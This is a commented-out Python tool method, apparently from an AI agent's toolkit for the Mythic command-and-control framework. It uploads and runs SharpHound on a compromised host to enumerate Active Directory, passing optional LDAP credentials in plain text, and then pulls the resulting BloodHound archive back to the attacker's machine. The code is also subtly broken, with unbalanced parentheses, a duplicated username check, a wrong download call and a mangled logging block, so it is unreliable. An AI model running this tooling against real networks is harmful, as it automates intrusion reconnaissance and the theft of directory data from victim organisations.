# @tool_method()
# async def sharphound_and_download(
#     self,
#     domain: t.Annotated[str, "domain to enumerate."],
#     ldap_username: t.Annotated[str | None, "LDAP username to use for Sharphound."] = None,
#     ldap_password: t.Annotated[str | None, "LDAP username to use for Sharphound."] = None,
#     local_filename: t.Annotated[str | None, "Filename"] = None,
# ) -> str | dict:
#     """
#     Run sharphound on the target callback to collect Bloodhound data. Then download the
#     Bloodhound results file to a local file. "local" being wherever the agent is running.
#     """

#     upload_result = await self.upload(
#         filename=SCRIPTS_DIR / "SharpHound.ps1",
#         reupload=False,
#     )
#     if upload_result["file_id"] is None:
#         return "Error running command 'sharphound_and_download'.\n\n Attempting to upload powershell script file to Mythic led to unknown error."
#     logger.info("Uploaded SharpHound to Mythic."))

#     pi_result = await self.powershell_import(filename=upload_result["filename"])
#     if "will now be imported in PowerShell commands" not in pi_result:
#         return f"Error running 'sharphound_and_download': {pi_result}"

#     zip_filename_marker = f"{uuid4()!s}.zip"
#     sharp_cmd = f"Invoke-BloodHound -Zipfilename {zip_filename_marker} -Domain {domain}"
#     if all([ldap_username, ldap_username]):
#         sharp_cmd += f" --ldapusername {ldap_username} --ldappassword {ldap_password}"

#     sharphound_result = await self.execute(command="powerpick " + sharp_cmd, timeout=120)

#     if "SharpHound Enumeration Completed" not in sharphound_result:
#         return f"Error running 'sharphound_and_download'.\n\n Command response:\n{sharphound_result}"

#     sharp_results_fn = await self.powerpick(
#         command=f"(Get-ChildItem -Path .\\ -Filter '*{zip_filename_marker}').name",
#         fix_dependencies=True,
#     )

#     if zip_filename_marker not in sharp_results_fn:
#         return f"Error running 'sharphound_and_download'.\n\n Command response:\n{sharp_results_fn}"

#     sharp_results_fn = sharp_results_fn.strip("\r\n").split("\r\n")[-1]

#     local_download_file = await self.execute(filepath=sharp_results_fn)

#     if not isinstance(local_download_file, dict):
#         return f"Error running 'sharphound_and_download'.\n\n Command response:\n{local_download_file}"
#     logger.info(f"Downloaded file to:{local_download_file['path']}"))

#     # 6. rename local file if supplied Command specified a specific filename to use
#     if local_filename:
#         Path.rename(local_download_file.path, local_filename)
#         logger.info(
#
#                 f"Renamed filename from {local_download_file.path} to {local_filename}"
#             )
#         )
#         local_download_file["path"] = str(Path(local_filename).resolve())
#         local_download_file["name"] = Path(local_download_file["path"]).name

#     return local_download_file
